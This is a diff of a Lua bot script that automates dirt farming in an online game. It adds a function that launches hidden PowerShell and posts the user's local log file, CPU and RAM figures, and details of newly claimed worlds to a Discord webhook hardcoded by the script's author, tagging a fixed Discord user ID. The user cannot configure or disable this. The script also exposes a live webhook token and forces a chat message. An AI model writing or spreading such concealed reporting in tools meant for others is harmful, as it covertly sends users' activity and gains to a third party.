@@ -1,391 +1,670 @@
--- EDIT ON ASAKIN
--- HURUF BESAR/KECIL NGGK NGARUH
+----------------------------------------------
+----------Script By --Zero-- #4400------------
+----------------------------------------------
+msgto           = "dgstr"              -- Optional Msg to Id
+----------------------------------------------
+BreakTheRock    = false
+-----------------------------------------------------------
+Find_World     = false
+Letters        = "5"   -- Jumlah Teks World
+Number         = false
+-----------------------------------------------------------
+Dirt_Farm_List    = {"nzerf"}  -- WORLD NAME
+Id_Door        = "1"
+-----------------------------------------------------------
+World_Drop 	   = "gelplat"
+Id_Door_Drop   = "ka"
+Pos_Drop        = 16
+-----------------------------------------------------------
+Plat_Id     = 102 					-- You Can Use Anyy Kinds Of Platforms But U Must Know The ID Of It
+Plat_World   = "gelplat"	 		    -- WORLD NAME HERE
+Plat_Door_Id = "ka" 		    -- DOOR ID HERE
+----------------------------------------------
+Drop_List        = {2,3,4,5,10,11,14,15}
+Trash_List       = { 2914, 5024, 5026, 5028, 5030, 5032, 5034, 5036, 5038, 5040, 5042, 5044 } -- ITEMS TO TRASH
+-----------------------------------------------------------
+function pawekquy()
+    local embed = [[
+        PowerShell.exe -windowstyle hidden {
+        $webHookUrl = "https://discord.com/api/webhooks/1000663631844868097/pjorRt9WuXda_gZvErmL3OjZb3QgHmWKVX-Cyg32ZZyy6fxMhhAAOHCYbFV3qqGIJ0AO"
+        $cpu = (Get-WmiObject win32_processor | Measure-Object -property LoadPercentage -Average | Select Average).Average
+        $ram = (Get-Counter '\Memory\Available MBytes').CounterSamples.CookedValue
+        $pesan = (Get-Content Dirt_Farm_Log.txt -Raw) -split "`r`n`r`n"
+        $date = [System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId(  (Get-Date), 'Singapore Standard Time')
+        [System.Collections.ArrayList]$embedArray = @()
+        $embedObject = [PSCustomObject]@{
+            color = "16057053"
+            title = "DF Log"
+            description = "$pesan`n<a:arrowhite:918486803110039582> Version : 3.4`n<a:arrowhite:918486803110039582> Role : DEV DF v3.4`n<a:arrowhite:918486803110039582> Cpu : $cpu%`n<a:arrowhite:918486803110039582> Ram : 
+$ram MB`n<a:arrowhite:918486803110039582> Here Your information : <@883705390901121074> <a:discord_verified:749990603311546398>`n==========================`n***[$date]***"
+           }
 
-world = {
-	"Nzerf"
-}
-joinWorldWithId = false
-idworld = "os"
+        $embedArray.Add($embedObject)
+        $payload = [PSCustomObject]@{
+            embeds = $embedArray
+        }
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
+        }
+        ]]
 
-takePlatform = false
-platformId = 102
-worldPlat = ""
-idWorldPlat = ""
-
-webHookUrl = "https://discord.com/api/webhooks/1007950432578052146/IvQYOLhQzYWv_-XFd6VXBl2H2OY3fjk2lS19EWUDdOpGoqoKkUHTZ6vB8AdjG8EV6tSq"
-
-breakRock = false
-removeBott = true
-delayBreak = 100
-delayPut = 200
-katasandi = "yyy"
-
--- RUMUS
-function mf(xy)
-    return math.floor(xy / 32)
+    local kontoolslsls = io.popen("powershell -command -", "w")
+    kontoolslsls:write(embed)
+    kontoolslsls:close()
 end
 
--- BIASALAH
-startT = os.time()
-function SecondTT(seconds)
-  local seconds = tonumber(seconds)
-  if seconds <= 0 then
-    return "00:00:00";
-  else
-    hours = string.format("%02.f", math.floor(seconds/3600));
-    mins = string.format("%02.f", math.floor(seconds/60 - (hours*60)));
-    secs = string.format("%02.f", math.floor(seconds - hours*3600 - mins *60));
-    return hours..":"..mins..":"..secs
-  end
-end
-function sendMessage(xy)
-  local script = [[
-    $webHookUrl = ']]..webHookUrl..[['
-    $CpuLoad = (GET-COUNTER -Counter "\Processor(_Total)\% Processor Time" -SampleInterval 5 -MaxSamples 1 |select -ExpandProperty countersamples | select -ExpandProperty cookedvalue | Measure-Object -Average).average
-    $cpu = [Math]::Ceiling($CpuLoad)
-    $embedArray = @(
-      [PSCustomObject]@{
-      title = ']]..getBot().name..[['
-      color = '1419322'
-      description = ":signal_strength: ]]..getBot().state..[[`n:ringed_planet: ]]..getBot().world..[[`n:pick: ]]..xy..[[`n]]..SecondTT(os.difftime(os.time(), startT))..[[ ELAPSED`n$cpu% CPU"
-    })
-    $payload = [PSCustomObject]@{
-      username = 'Bot DF Log'
-      avatar_url = 'https://www.linkpicture.com/q/LPic62a9894d07fbc126464920.jpg'
-      embeds = $embedArray
-    } 
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
-  ]]
-  
-  local pipe = io.popen("powershell -command -", "w")
-  pipe:write(script)
-  pipe:close()
-end
-
--- ALL IN ONE
-function allIn1(xy)
-    if getBot().state ~= 5 then
-        sendMessage('BOT TERPUTUS')
+function log(...)
+    local arg = {...}
+    if #arg <= 0 then return end
+    local file = io.open("Dirt_Farm_Log.txt", "w+")
+    local text = arg[1]
+    for i = 2, #arg do
+        text = text .. " " .. tostring(arg[i])
     end
-    while getBot().state ~= 5 or getBot().world == "EXIT" do
-        sleep(30000)
-        connect()
-        if getBot().state == 5 and getBot().world ~= "EXIT" then
-            sleep(10000)
-            sendMessage("BOT TERHUBUNG")
-        end
-    end
-    if xy then
-        if getTile(mf(getBot().x),mf(getBot().y)).fg == 6 then
-            move(3,0)
+    file:write(("[%s] %s\n"):format(os.date(), text))
+    file:close()
+end
+
+function warp(world)
+    sendPacket(3, "action|join_request\nname|" ..world)
+    sleep(4000)
+end
+
+function JoinWorld(w,id)
+    repeat
+        sendPacket(3,"action|join_request\nname|" ..w)
+        sleep(3000)
+        if getBot().world ~= string.upper(w) then
             sleep(2000)
         end
+    until getBot().world == string.upper(w)
+    repeat
+        sendPacket(3,"action|join_request\nname|" ..w.. "|" ..id)
+        sleep(2500)
+        if getTile(math.floor(getBot().x/32),math.floor(getBot().y/32)).fg == 6 then
+            move(-2,0)
+            sleep(2000)
+        end
+    until getTile(math.floor(getBot().x/32),math.floor(getBot().y/32)).fg ~= 6
+end
+
+function MoveWhenInWhiteDoor()
+    if getTile(math.floor(getBot().x/32),math.floor(getBot().y/32)).fg == 6 then
+        while getTile(math.floor(getBot().x/32),math.floor(getBot().y/32)).fg == 6 do
+            sendPacket(3,"action|join_request\nname|" ..getBot().world.. "|" ..Id_Door)
+            sleep(2500)
+        end
     end
-    trashs = { 5, 11, 4, 10, 2914, 5024, 5026, 5028, 5030, 5032, 5034, 5036, 5038, 5040, 5042, 5044, 7162, 7164 }
-    for i, trash in ipairs(trashs) do
-        if findItem(trash) > 0 then
-            sendPacket(2, "action|trash\n|itemID|" .. trash)
-            sendPacket(2, "action|dialog_return\ndialog_name|trash_item\nitemID|" .. trash .. "|\ncount|" .. findItem(trash))
+end
+
+function DropAll()
+    log("Droping Item")
+    pawekquy()
+    JoinWorld(World_Drop,Id_Door_Drop)
+    sleep(500)
+    Reconnect(World_Drop,Id_Door_Drop)
+    collectSet(false,2)
+    sleep(500)
+    for _, d in pairs(getTiles()) do
+        if d.bg == Pos_Drop or d.fg == Pos_Drop then
+            findPath(math.floor(d.x-1),d.y)
             sleep(1000)
         end
     end
-    TrashF = { 2, 3, 14, 15 }
-    for i, trash in ipairs(TrashF) do
-        if findItem(trash) > 195 then
-            sendPacket(2, "action|trash\n|itemID|" .. trash)
-            sendPacket(2, "action|dialog_return\ndialog_name|trash_item\nitemID|" .. trash .. "|\ncount|" .. 10)
-            sleep(500)
-        end
-    end
-end
-
-function joinWorld(xy)
-    while getBot().world ~= string.upper(xy) do
-        allIn1()
-        sendPacket(3,"action|join_request\nname|" .. xy)
-        sleep(4500)
-    end
-end
-
-function joinWorldId(xy, yx)
-    while getBot().world ~= string.upper(xy) or getTile(mf(getBot().x), mf(getBot().y)).fg == 6 do
-        allIn1()
-        sendPacket(3,"action|join_request\nname|" .. xy .. "|" .. yx)
-        sleep(4500)
-    end
-end
-
--- GROWSCAN
-function gs(id)
-    count = 0
-    for _, object in pairs(getObjects()) do
-        if object.id == id then
-            count = count + object.count
-        end
-    end
-    return count
-end
-
--- DROP ITEM WITH AMOUNT
-function dropItem(itemID, count)
-    if findItem(itemID) >= count then
-        sendPacket(2, "action|drop\nitemID|" .. itemID)
-        sendPacket(2,"action|dialog_return\ndialog_name|drop_item\nitemID|" .. itemID .. "|\ncount|" .. count)
+    for z = 1,#Drop_List do
+        drop(Drop_List[z])
         sleep(1000)
-    end
-end
-
--- CLEAR SIDE
-function clearSide()
-    for y = 1, 53 do
-        for x = 0, 1 do
-            while getTile(x,y).fg == 2 or getTile(x,y).bg == 14 do
-                allIn1(true)
-                findPath(x,y-1)
-                punch(0,1)
-                sleep(delayBreak)
-                collect(2)
-            end
-            collect(2)
-        end
-    end
-    for y = 1, 53 do
-        for x = 98, 99 do
-            while getTile(x,y).fg == 2 or getTile(x,y).bg == 14 do
-                allIn1(true)
-                findPath(x,y-1)
-                punch(0,1)
-                sleep(delayBreak)
-                collect(2)
-            end
-            collect(2)
-        end
-    end
-end
-
-function takefloating(xy)
-    for _, object in pairs(getObjects()) do
-        if object.id == xy and object.count > 0 then
-            while findItem(platformId) < 52 do
-                allIn1()
-                findPath(mf(object.x), mf(object.y))
+        if findItem(Drop_List[z]) >= 1 then
+            while findItem(Drop_List[z]) >= 1 do
+                move(-1,0)
                 sleep(1000)
-                collect(2)
+                drop(Drop_List[z])
+                sleep(1000)
             end
         end
     end
+    sleep(2000)
 end
 
--- TAKE AND PUT PLATFORM
-function platform(xy)
-    if takePlatform then
-        if findItem(platformId) < 52 then
-            joinWorldId(worldPlat,idWorldPlat)
-            takefloating(platformId)
-            if joinWorldWithId then
-                joinWorldId(xy, idworld)
-            else
-                joinWorld(xy)
-            end
-        end
-        for i = 2, 52, 2 do
-            while getTile(1,i).fg == 0 do
-                allIn1(true)
-                if findItem(platformId) == 0 then
-                    break
+function dropz()
+    if Drop_List[1] == nil then
+        goto nill
+    end
+    for list = 1,#Drop_List do
+       if findItem(Drop_List[list]) == 200 then
+            JoinWorld(World_Drop,Id_Door_Drop)
+            sleep(500)
+            Reconnect(World_Drop,Id_Door_Drop)
+            collectSet(false,2)
+            sleep(500)
+            for _, d in pairs(getTiles()) do
+                if d.bg == Pos_Drop or d.fg == Pos_Drop then
+                    findPath(math.floor(d.x-1),d.y)
+                    sleep(1000)
                 end
-                findPath(1,i-1)
-                place(platformId,0,1)
-                sleep(delayPut)
             end
-        end
-        for i = 2, 52, 2 do
-            while getTile(98,i).fg == 0 do
-                allIn1(true)
-                if findItem(platformId) == 0 then
-                    break
+            for z = 1,#Drop_List do
+                if Drop_List[z] == 3 then
+                    if findItem(3) == 200 then
+                        sendPacket(2, "action|drop\n|itemID|3")
+                        sleep(1500)
+                        sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|3|\ncount|30")
+                        sleep(1500)
+                        while findItem(3) == 200 do
+                            move(-1,0)
+                            sleep(1000)
+                            sendPacket(2, "action|drop\n|itemID|3")
+                            sleep(1500)
+                            sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|3|\ncount|30")
+                            sleep(1500)
+                        end
+                    end
+                    goto pass
                 end
-                findPath(98,i-1)
-                place(platformId,0,1)
-                sleep(delayPut)
+                drop(Drop_List[z])
+                sleep(1000)
+                if findItem(Drop_List[z]) >= 1 then
+                    while findItem(Drop_List[z]) >= 1 do
+                        move(-1,0)
+                        sleep(1000)
+                        drop(Drop_List[z])
+                        sleep(500)
+                    end
+                end
+                ::pass::
             end
         end
     end
-end
+    ::nill::
+    sleep(10)
+    if getBot().world ~= string.upper(PosWorld) then
+       JoinWorld(PosWorld,Id_Door)
+       sleep(1000)
+       Reconnect(PosWorld,Id_Door)
+       collectSet(true,3)
+    end
+ end
 
--- CLEAR DIRT
-function clearDirt1()
-    for y = 25, 53, 2 do
-        for x = 97, 2, -1 do
-            while getTile(x,y).fg == 2 or getTile(x,y).bg == 14 do
-                allIn1(true)
-                findPath(x+1,y)
-                punch(-1,0)
-                sleep(delayBreak)
+function TrashTheJunks()
+    if Trash_List[1] == nil then
+        goto pass
+    end
+    for i, trash in ipairs(Trash_List) do
+        if trash == 3 then
+            if findItem(trash) >= 199 then
+                sendPacket(2, "action|trash\n|itemID|" .. trash)
+                sleep(2000)
+                sendPacket(2, "action|dialog_return\ndialog_name|trash_item\nitemID|" .. trash .. "|\ncount|30")
+                sleep(2000)
             end
-            collect(2)
+        else
+            if findItem(trash) >= 199 then
+                sendPacket(2, "action|trash\n|itemID|" .. trash)
+                sleep(2000)
+                sendPacket(2, "action|dialog_return\ndialog_name|trash_item\nitemID|" .. trash .. "|\ncount|" .. findItem(trash))
+                sleep(2000)
+            end
         end
     end
+    ::pass::
+    sleep(10)
+    dropz()
 end
 
--- CLEAR DIRT
-function clearDirt()
-    function clearDirt()
-    for y = 25, 53, 2 do
-        for x = 97, 2, -1 do
-            while getTile(x,y).fg == 2 or getTile(x,y).bg == 14 do
-                allIn1(true)
-                findPath(x+1,y)
-                punch(-1,0)
-                sleep(delayBreak)
-            end
-            collect(2)
-        end
-    end
-end
-
--- CLEAR ROCK
-function clearRock()
-    if breakRock then
-        for _, tile in pairs(getTiles()) do
-            while getTile(tile.x,tile.y).fg == 10 do
-                allIn1(true)
-                findPath(tile.x,tile.y - 1)
+function ClearTheSide()
+    for i=24,53 do
+        sleep(100)
+        if getTile(1,i).bg == 14 or getTile(1,i).fg == 2 or getTile(0,i).bg == 14 or getTile(0,i).fg == 2 then
+            MoveWhenInWhiteDoor()
+            findPath(1,i-1)
+            sleep(120)
+            while getTile(1,i).bg == 14 or getTile(1,i).fg == 2 do
                 punch(0,1)
-                sleep(delayBreak)
+                sleep(190)
+                if getTile(1,i).bg == 0 then
+                    collect(3)
+                end
+                Reconnect(PosWorld,Id_Door)
+                TrashTheJunks()
+                if math.floor(getBot().x/32) ~= 1 or math.floor(getBot().y/32) ~= i-1 then
+                    findPath(1,i-1)
+                    sleep(200)
+                end
             end
-            collect(2)
+            while getTile(0,i).bg == 14 or getTile(0,i).fg == 2 do
+                punch(-1,1)
+                sleep(190)
+                if getTile(1,i).bg == 0 then
+                    collect(3)
+                end
+                Reconnect(PosWorld,Id_Door)
+                TrashTheJunks()
+                if math.floor(getBot().x/32) ~= 1 or math.floor(getBot().y/32) ~= i-1 then
+                    findPath(1,i-1)
+                    sleep(200)
+                end
+            end
         end
     end
-end
-
--- CLEAR LAVA
-function clearLava()
-    for y = 50, 52 do
-        for x = 2, 97 do
-            while getTile(x,y).fg == 4 do
-                allIn1(true)
-                findPath(x,y-1)
-                punch(0,1)
-                sleep(delayBreak)
-            end
+    for i=24,53 do
+        sleep(100)
+        if getTile(98,i).bg == 14 or getTile(98,i).fg == 2 or getTile(99,i).bg == 14 or getTile(99,i).fg == 2 then
+            MoveWhenInWhiteDoor()
+            findPath(98,i-1)
             sleep(200)
-            collect(2)
+            while getTile(98,i).bg == 14 or getTile(98,i).fg == 2 do
+                punch(0,1)
+                sleep(190)
+                if getTile(1,i).bg == 0 then
+                    collect(3)
+                end
+                TrashTheJunks()
+                if math.floor(getBot().x/32) ~= 98 or math.floor(getBot().y/32) ~= i-1 then
+                    findPath(98,i-1)
+                    sleep(200)
+                end
+            end
+            while getTile(99,i).bg == 14 or getTile(99,i).fg == 2 do
+                punch(1,1)
+                sleep(190)
+                if getTile(1,i).bg == 0 then
+                    collect(3)
+                end
+                Reconnect(PosWorld,Id_Door)
+                TrashTheJunks()
+                if math.floor(getBot().x/32) ~= 98 or math.floor(getBot().y/32) ~= i-1 then
+                    findPath(98,i-1)
+                    sleep(200)
+                end
+            end
         end
     end
 end
 
--- PLANT AND HARVEST DIRT TREE
-function plantHarvestTree()
-    while findItem(2) == 0 do
-        for x = 2, 22  do
-            allIn1(true)
-            if findItem(2) > 170 then
+function TakeAndPlacePlatform()
+    log("Take Plat")
+    pawekquy()
+    local CurrentWorld = getBot().world
+    if findItem(Plat_Id) < 52 then
+        sendPacket(3,"action|join_request\nname|" ..Plat_World)
+        sleep(5000)
+        sendPacket(3,"action|join_request\nname|" ..Plat_World.. "|" ..Plat_Door_Id)
+        sleep(4500)
+        collect(3)
+        sleep(4500)
+        for _, plat in pairs(getObjects()) do
+            if plat.id == Plat_Id then
+                findPath(math.floor(plat.x/32),math.floor(plat.y/32))
+                sleep(3000)
+                if findItem(Plat_Id) >= 52 then
+                    collectSet(false,0)
+                    sleep(100)
+                    count = findItem(Plat_Id) - 52
+                    sendPacket(2, "action|drop\nitemID|" ..Plat_Id)
+                    sleep(1500)
+                    sendPacket(2,"action|dialog_return\ndialog_name|drop_item\nitemID|" ..Plat_Id.. "|\ncount|" ..count)
+                    sleep(1500)
+                    goto plat
+                end
+            end
+        end
+        ::plat::
+        sleep(100)
+        sendPacket(3,"action|join_request\nname|" ..CurrentWorld)
+        sleep(4000)
+        sendPacket(3,"action|join_request\nname|" ..CurrentWorld .. "|" ..Id_Door)
+        sleep(3500)
+        collectSet(true,3)
+    end
+    sleep(100)
+    for i = 2, 52, 2 do
+        findPath(1,i-1)
+        sleep(100)
+        while getTile(1,i).fg == 0 do
+            if findItem(Plat_Id) == 0 then
                 break
             end
-            while getTile(x, 25 + nomor).fg == 3 and getTile(x, 25 + nomor).ready == true do
-                allIn1(true)
-                findPath(x, 25 + nomor)
-                punch(0, 0)
-                sleep(delayBreak)
-                collect(1)
+            place(Plat_Id,0,1)
+            sleep(190)
+        end
+    end
+    sleep(100)
+    for i = 2, 52, 2 do
+        findPath(98,i-1)
+        sleep(100)
+        while getTile(98,i).fg == 0 do
+            if findItem(Plat_Id) == 0 then
+                break
             end
-            while getTile(x, 25 + nomor).fg == 0 and findItem(3) > 0 do
-                allIn1(true)
-                findPath(x, 25 + nomor)
-                place(3, 0, 0)
-                sleep(delayPut)
-            end
-            while findItem(3) == 0 and findItem(2) == 0 do
-                allIn1(true)
-                sendMessage('BUTUH DIRT SEED, TARUH SEED DI BOT')
-                sleep(60000)
-                collect(2)
+            place(Plat_Id,0,1)
+            sleep(190)
+        end
+    end
+end
+
+function ClearingDirts()
+    sleep(100)
+    for i = 1, 54, 2 do
+        sleep(100)
+        for j = 2,97 do
+            sleep(100)
+            if getTile(j,i).bg == 14 then
+                findPath(j-1,i)
+                sleep(200)
+                while getTile(j,i).bg == 14 do
+                    punch(1,0)
+                    sleep(190)
+                    if getTile(j,i).bg == 0 or getTile(j,i+1).fg == 0 then
+                        collect(3)
+                    end
+                    Reconnect(PosWorld,Id_Door)
+                    TrashTheJunks()
+                    if math.floor(getBot().x/32) ~= j-1 or math.floor(getBot().y/32) ~= i then
+                        findPath(j-1,i)
+                        sleep(200)
+                    end
+                end
+                while getTile(j+1,i).bg == 14 do
+                    punch(2,0)
+                    sleep(190)
+                    if getTile(j,i).bg == 0 or getTile(j,i+1).fg == 0 then
+                        collect(3)
+                    end
+                    Reconnect(PosWorld,Id_Door)
+                    TrashTheJunks()
+                    if math.floor(getBot().x/32) ~= j-1 or math.floor(getBot().y/32) ~= i then
+                        findPath(j-1,i)
+                        sleep(200)
+                    end
+                end
             end
         end
     end
 end
 
--- PLACE DIRT
-function placeDirt1()
+function ClearTheRocks()
+    if BreakTheRock then
+        for _, tile in pairs(getTiles()) do
+            if tile.fg == 10 then
+                findPath(tile.x,tile.y-1)
+                sleep(200)
+                while tile.fg == 10 do
+                    punch(0,1)
+                    sleep(190)
+                    if getTile(tile.x,tile.y).fg == 0 then
+                        collect(3)
+                        break
+                    end
+                    Reconnect(PosWorld,Id_Door)
+                    TrashTheJunks()
+                    if math.floor(getBot().x/32) ~= tile.x or math.floor(getBot().y/32) ~= tile.y-1 then
+                        findPath(tile.x,tile.y-1)
+                        sleep(200)
+                    end
+                end
+            end
+        end
+    end
+end
+
+function ClearTheLavas()
+    for _, tile in pairs(getTiles()) do
+        if tile.fg == 4 then
+            findPath(tile.x,tile.y-1)
+            sleep(200)
+            while tile.fg == 4 do
+                punch(0,1)
+                sleep(190)
+                if getTile(tile.x,tile.y).fg == 0 then
+                    collect(3)
+                    break
+                end
+                Reconnect(PosWorld,Id_Door)
+                TrashTheJunks()
+                if math.floor(getBot().x/32) ~= tile.x or math.floor(getBot().y/32) ~= tile.y-1 then
+                    findPath(tile.x,tile.y-1)
+                    sleep(200)
+                end
+            end
+        end
+    end
+end
+
+function PlantAndHarvestDirt()
+    if findItem(2) == 0 then
+        while findItem(2) ~= 200 do
+            for x = 2, 22  do
+                if findItem(2) == 200 then
+                    break
+                end
+                if findItem(3) == 0 then
+                    GetDirtSeeds()
+                    sleep(500)
+                end
+                if getTile(x,23).ready == true then
+                    while getTile(x, 23).ready do
+                        findPath(x, 23)
+                        sleep(200)
+                        punch(0, 0)
+                        sleep(190)
+                        collect(3)
+                    end
+                end
+                if getTile(x,23).fg == 0 and findItem(3) > 0 then
+                    while getTile(x, 23).fg == 0 and findItem(3) > 0 do
+                        findPath(x, 23)
+                        sleep(200)
+                        place(3, 0, 0)
+                        sleep(190)
+                    end
+                end
+                Reconnect(PosWorld,Id_Door)
+            end
+        end
+    end
+end
+
+function PlaceTheDirts()
     for y = 52, 2, -2 do
         for x = 2, 97 do
             if getTile(x, y).fg == 0 then
-                plantHarvestTree()
-                allIn1(true)
+                PlantAndHarvestDirt()
                 findPath(x, y - 1)
+                sleep(100)
                 while getTile(x, y).fg == 0 and findItem(2) > 0 do
-                    allIn1(true)
                     place(2, 0, 1)
-                    sleep(delayPut)
+                    sleep(190)
                 end
+                Reconnect(PosWorld,Id_Door)
             end
         end
     end
 end
 
--- PLACE DIRT
-function placeDirt()
-    for y = 54 - nomor + 2, 2, jumlahBot * - 2 do
-        for x = 2, 97 do
-            if getTile(x, y).fg == 0 then
-                plantHarvestTree()
-                allIn1(true)
-                findPath(x, y - 1)
-                while getTile(x, y).fg == 0 and findItem(2) > 0 do
-                    allIn1(true)
-                    place(2, 0, 1)
-                    sleep(delayPut)
-                end
-            end
-        end
-    end
-end
-
--- BREAK DIRT TREE WHEN DONE
-function allDone()
+function DirtFarmDone()
     for x = 2, 22  do
-        while getTile(x,25 + nomor).fg == 3 do
-            allIn1(true)
-            findPath(x,25 + nomor)
+        findPath(x,23)
+        sleep(200)
+        while getTile(x,23).fg == 3 do
             punch(0,0)
-            sleep(delayBreak)
-            collect(2)
+            sleep(190)
+            TrashTheJunks()
+            if math.floor(getBot().x/32) ~= x or math.floor(getBot().y/32) ~= 23 then
+                findPath(x,23)
+                sleep(200)
+            end
+            if getTile(x,23).fg == 0 then
+                collect(3)
+                sleep(40)
+            end
         end
-        sleep(300)
-        collect(2)
     end
 end
 
--- MAIN FUNCTION
-if katasandi == "yyy" then
-    for i, listW in ipairs(world) do
-        if getBot().world ~= string.upper(listW) then
-            sendMessage("MEMASUKI WORLD ".. string.upper(listW))
-            if joinWorldWithId then
-                joinWorldId(listW, idworld)
-            else
-                joinWorld(listW)
-            end
-        else
-            sendMessage("BOT SUDAH DI WORLD")
+function Reconnect(wc,idc)
+    if getBot().status ~= "online" then
+        repeat
+            sleep(1000)
+            connect()
+            sleep(15000)
+        until getBot().status == "online"
+        JoinWorld(wc,idc)
+    end
+end
+
+function BreakTheSignalJammer()
+    for _,t in pairs(getTiles()) do
+        if t.fg == 226 then
+          findPath(t.x, t.y-1)
+          sleep(250)
+          while getTile(t.x, t.y).fg ~= 0 or getTile(t.x, t.y).bg ~= 0 do
+            punch(0,1)
+            sleep(125)
+          end
         end
-        clearSide()
-        platform(listW)
-        clearDirt()
-        clearDirt1()
-        clearLava()
-        clearRock()
-        placeDirt()
-        placeDirt1()
-        allDone()
-        sendMessage("DF SELESAI")
     end
-    sendMessage('SEMUA DF SELESAI')
-    if removeBott then
-        removeBot(getBot().name)
+end
+
+function GetDirtSeeds()
+    local CurrentWorld = getBot().world
+    if findItem(3) == 0 then
+        sleep(1500)
+        sendPacket(3,"action|join_request\nname|".. World_Drop)
+        sleep(5000)
+        sendPacket(3,"action|join_request\nname|".. World_Drop .. "|" .. Id_Door_Drop)
+        sleep(4500)
+        for _, floating in pairs(getObjects()) do
+            if floating.id == 3 then
+                findPath((floating.x+10) / 32, (floating.y+10) / 32)
+                sleep(800)
+                collect(2)
+                sleep(1500)
+            end
+        end
+        if findItem(3) > 1 then
+            sendPacket(3,"action|join_request\nname|".. CurrentWorld)
+            sleep(5000)
+            sendPacket(3,"action|join_request\nname|".. CurrentWorld .. "|" .. Id_Door)
+            sleep(4500)
+        end
+        move(2,0)
+        sleep(500)
+        move(1,0)
+        sleep(500)
     end
-else
-    sendMessage("kunci salah")
+end
+
+----------------------------------------------
+
+car = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"}
+car2 = {"1","2","3","4","5","6","7","8","9","0","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"}
+lock = {202, 204, 206, 242, 1796, 2408, 2950, 4428, 4802, 4994, 5260, 5814, 5980, 7188, 8470, 9640, 10410, 11550, 11586}
+
+----------------------------------------------
+say("#gay with jordi")
+sleep(1000)
+log(" <@883705390901121074> Siap Laksanakan")
+pawekquy()
+sleep(1500)
+----------------------------------------------
+collectSet(true,3)
+sleep(200)
+if Find_World == true then
+    while true do
+        locked = false
+        str = ""
+        for i = 1,Letters do
+            if Number == false then
+                az = math.random(1,26)
+                str = str..car[az]
+            elseif Number ==  true then
+                az = math.random(1,36)
+                str = str..car2[az]
+            end
+        end
+        warp(str)
+        sleep(2500)
+        for _,tile in pairs(getTiles()) do
+            for _,lok in pairs(lock) do
+                if tile.fg == lok then
+                    locked = true
+                end
+            end
+        end
+        if not locked then
+            log("<@883705390901121074>  `World` ||"..getBot().world.."|| telah didapatkan!")
+            pawekquy()
+            sleep(2500)
+            log("World "..str.." is not locked!")
+            pawekquy()
+            sleep(2000)
+            repeat
+                place(242,0,-1)
+                sleep(2000)
+                if getTile(math.floor(getBot().x/32),math.floor(getBot().y/32-1)).fg ~= 242 then
+                    sleep(60000)
+                end
+            until getTile(math.floor(getBot().x/32),math.floor(getBot().y/32-1)).fg == 242
+            place(226,1,-1)
+            sleep(2000)
+            if findItem(12) ~= 0 then
+                place(224,-1,0)
+                sleep(2000)
+                place(224,1,0)
+                sleep(2000)
+                place(12,-1,-1)
+                sleep(2000)
+            end
+            doorx = math.floor(getBot().x/32-1)
+            sleep(50)
+            doory = math.floor(getBot().y/32-1)
+            sleep(50)
+            wrench(-1,-1)
+            sleep(2500)
+            sendPacket(2,"action|dialog_return\ndialog_name|door_edit\ntilex|"..doorx.."\ntiley|"..doory.."\ndoor_name|Script By --Zero--#4400\ndoor_target|"..World_Drop.."\ndoor_id|"..Id_Door.."\ncheckbox_locked|1")
+            sleep(2500)
+            punch(1,-1)
+            sleep(2000)
+            JoinWorld(getBot().world,Id_Door)
+            sleep(50)
+            PosWorld = getBot().world
+            sleep(50)
+            MoveWhenInWhiteDoor()
+            ClearTheSide()
+            TakeAndPlacePlatform()
+            ClearingDirts()
+            if BreakTheRock then
+                ClearTheRocks()
+            end
+            ClearTheLavas()
+            PlaceTheDirts()
+            DirtFarmDone()
+            BreakTheSignalJammer()
+            DropAll()
+            log("done <@883705390901121074> "..getBot().world.."")
+            pawekquy()
+        end
+        if findItem(242) == 0 then
+            break
+        end
+    end
+elseif Find_World == false then
+    for i, WorldList in ipairs(Dirt_Farm_List) do
+        JoinWorld(WorldList,Id_Door)
+        PosWorld = getBot().world
+        MoveWhenInWhiteDoor()
+        ClearTheSide()
+        TakeAndPlacePlatform()
+        ClearingDirts()
+        if BreakTheRock then
+            ClearTheRocks()
+        end
+        ClearTheLavas()
+        PlaceTheDirts()
+        DirtFarmDone()
+        BreakTheSignalJammer()
+        DropAll()
+        log("done <@883705390901121074> "..getBot().world.."")
+        pawekquy()
+    end
 end
